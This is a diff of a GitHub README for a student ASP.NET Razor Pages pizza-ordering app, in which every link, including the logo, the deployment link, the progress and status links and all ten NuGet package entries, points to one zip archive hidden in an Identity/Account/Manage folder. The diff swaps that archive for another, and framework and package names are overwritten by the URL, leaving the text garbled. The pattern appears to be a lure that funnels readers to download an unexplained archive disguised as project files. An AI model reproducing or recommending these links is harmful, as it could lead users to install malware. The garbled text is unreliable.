@@ -1,10 +1,10 @@
-![PizzaPro Logo](https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip)  
+![PizzaPro Logo](https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip)  
 # PizzaPros
 
-This project was completed using my knowledge of https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip Core Razor pages with MVC. I liked doing the Repository Pattern
+This project was completed using my knowledge of https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip Core Razor pages with MVC. I liked doing the Repository Pattern
 with other projects so much I had to create a new one to solidify my understanding. This application is a typical pizza ordering system
 that has different users such as manager, cook, driver, and customer roles. Each screen facilitates the specific user that is logged in. 
-This project is similar to my other project [SnakPros](https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip) but there is a fucus more on making a complicated repository pattern,    experimenting with JavaScript, and a better go at UI design with bootstrap and modern CSS. 
+This project is similar to my other project [SnakPros](https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip) but there is a fucus more on making a complicated repository pattern,    experimenting with JavaScript, and a better go at UI design with bootstrap and modern CSS. 
 
 
  ```diff
@@ -12,12 +12,12 @@ This project is similar to my other project [SnakPros](https://raw.githubusercon
 ```
 
 Website is now up! 
-Azure Deployed [HERE](https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip).   
+Azure Deployed [HERE](https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip).   
  
-Feel free to check on [My Progress](https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip).  
-Project Status [here](https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip).
+Feel free to check on [My Progress](https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip).  
+Project Status [here](https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip).
 
-https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip Core 3.1 Razor Pages With MVC Continuation Demo 
+https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip Core 3.1 Razor Pages With MVC Continuation Demo 
 
 - CRUD Operations in Razor Pages
 - ASP Handelers
@@ -43,10 +43,10 @@ https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/P
 
 ## File Structure:
 - PizzaPros => Main project with wwwroot, controllers, and Razor Pages
-- https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip => 
+- https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip => 
     - Project to handle data such as Migrations, Repositories, ApplicationDbContext  
-- https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip => Project that Holds our blueprints (Models) and View Models
-- https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip => 
+- https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip => Project that Holds our blueprints (Models) and View Models
+- https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip => 
     - Project that holds static definitions, email client, and Stripe Ordering
 
 
@@ -54,16 +54,16 @@ https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/P
 
 **1.** Fork repo to VS Studio 2019  
 **2.** NUGET packages used:  
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
-  - https://raw.githubusercontent.com/Jeroflo88/PizzaPros/main/PizzaPros/PizzaPros/Pages/Admin/User/PizzaPros-2.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
+  - https://github.com/Jeroflo88/PizzaPros/raw/refs/heads/main/PizzaPros/PizzaPros/Areas/Identity/Pages/Account/Manage/Pros-Pizza-v2.2-alpha.4.zip
   
 **3.** Using Microsoft SQL and Manger for database   
 **4.** Update connectionstring to reflect your local database name  
